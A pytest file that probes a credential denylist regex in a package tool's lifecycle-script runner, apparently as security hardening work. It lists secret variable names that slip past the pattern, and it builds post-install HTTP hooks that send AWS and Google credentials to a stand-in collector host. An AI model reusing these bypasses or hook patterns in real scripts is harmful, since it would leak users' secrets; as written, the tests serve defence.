"""Vector 1 + 5: credential denylist suffix gaps.

The denylist regex ``(?:TOKEN|SECRET|PAT|KEY|PASSWORD|CREDENTIAL|AUTHTOKEN)$``
is anchored with ``$``. Any secret-bearing variable whose name ends in a
PLURAL form (``...TOKENS``, ``...KEYS``, ``...SECRETS``, ``...CREDENTIALS``,
``...PATS``) or a trailing qualifier (``..._ID``) slips past it and leaks
into HTTP header expansion AND the command subprocess environment.

Each test asserts the SECURE expectation (the secret is blocked / stripped),
so genuine breaks fail on head code and become hardening targets. The two
correctly-blocked singular forms are regression traps that pass today.
"""

from __future__ import annotations

import pytest

from apm_cli.core.lifecycle_scripts import ScriptEntry
from apm_cli.core.script_executors import _build_script_env, _expand_env_vars

from .fixtures.helpers import capture_http_headers

# Secret-bearing names that the suffix-anchored regex FAILS to catch.
LEAKING_NAMES = [
    "GOOGLE_APPLICATION_CREDENTIALS",  # ends CREDENTIALS, not CREDENTIAL
    "AWS_ACCESS_KEY_ID",  # ends _ID
    "FOO_TOKENS",  # plural TOKEN
    "FOO_KEYS",  # plural KEY
    "FOO_SECRETS",  # plural SECRET
    "FOO_CREDENTIALS",  # plural CREDENTIAL
    "FOO_PATS",  # plural PAT
    "NPM_AUTHTOKENS",  # plural AUTHTOKEN
]

# Names that ARE correctly blocked (regression traps).
BLOCKED_NAMES = [
    "AWS_SECRET_ACCESS_KEY",  # ends KEY
    "SECRET_ACCESS_KEY",  # ends KEY
    "DB_PASSWORD",  # ends PASSWORD
    "API_KEY",  # ends KEY
]


class TestSuffixGapHeaderExpansion:
    """Suffix-gap secrets must not expand into HTTP header values."""

    @pytest.mark.parametrize("name", LEAKING_NAMES)
    def test_suffix_gap_name_blocked_in_header(
        self, name: str, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(name, "s3cr3t-value")
        # Secure expectation: a credential-bearing var never reaches the wire.
        assert _expand_env_vars(f"Bearer ${{{name}}}") == "Bearer "

    @pytest.mark.parametrize("name", BLOCKED_NAMES)
    def test_blocked_name_blocked_in_header(
        self, name: str, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(name, "s3cr3t-value")
        assert _expand_env_vars(f"Bearer ${{{name}}}") == "Bearer "


class TestSuffixGapEndToEndHeader:
    """End-to-end: the leaked value must not appear in a captured POST header."""

    def test_google_credentials_not_sent_in_header(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("GOOGLE_APPLICATION_CREDENTIALS", "/keys/sa-token.json")
        script = ScriptEntry(
            script_type="http",
            event="post-install",
            url="https://collector.example.com/hook",
            headers={"X-Auth": "${GOOGLE_APPLICATION_CREDENTIALS}"},
        )
        headers = capture_http_headers(script, monkeypatch)
        assert headers.get("X-Auth") == "", (
            "GOOGLE_APPLICATION_CREDENTIALS leaked into outbound HTTP header"
        )

    def test_aws_access_key_id_not_sent_in_header(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setenv("AWS_ACCESS_KEY_ID", "AKIAEXAMPLE1234567")
        script = ScriptEntry(
            script_type="http",
            event="post-install",
            url="https://collector.example.com/hook",
            headers={"X-Key": "id=${AWS_ACCESS_KEY_ID}"},
        )
        headers = capture_http_headers(script, monkeypatch)
        assert "AKIAEXAMPLE1234567" not in headers.get("X-Key", ""), (
            "AWS_ACCESS_KEY_ID leaked into outbound HTTP header"
        )


class TestSuffixGapCommandEnv:
    """Suffix-gap secrets must be stripped from the command subprocess env."""

    @pytest.mark.parametrize("name", LEAKING_NAMES)
    def test_suffix_gap_name_stripped_from_command_env(
        self, name: str, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(name, "s3cr3t-value")
        script = ScriptEntry(script_type="command", event="post-install", bash="env")
        env = _build_script_env(script)
        # Secure expectation: credential-bearing var is not inherited.
        assert name not in env, f"{name} leaked into command subprocess env"

    @pytest.mark.parametrize("name", BLOCKED_NAMES)
    def test_blocked_name_stripped_from_command_env(
        self, name: str, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv(name, "s3cr3t-value")
        script = ScriptEntry(script_type="command", event="post-install", bash="env")
        env = _build_script_env(script)
        assert name not in env
